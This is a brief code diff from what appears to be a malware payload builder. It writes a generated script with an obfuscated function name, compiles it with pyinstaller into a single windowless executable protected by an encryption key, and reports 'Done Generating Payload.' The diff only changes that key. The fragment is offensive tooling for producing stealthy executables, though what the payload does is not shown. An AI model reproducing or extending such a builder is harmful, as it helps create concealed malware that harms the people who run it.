@@ -260,10 +260,10 @@ def TCjgbxixqsdxEc():
 TCjgbxixqsdxEc()
 ''')
     if platform.system() == "Windows":
-        os.system(f"pyinstaller {options.filename} --onefile --key StealthyPatriot1969#$% --noconsole")
+        os.system(f"pyinstaller {options.filename} --onefile --key StealthyPatriot1969 --noconsole")
     #time.sleep(15)
     if platform.system() == "Linux":
-        os.system(f"pyinstaller {options.filename} --onefile --key StealthyPatriot1969#$% --noconsole")
+        os.system(f"pyinstaller {options.filename} --onefile --key StealthyPatriot1969 --noconsole")
     time.sleep(2)
     print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
 GenX()
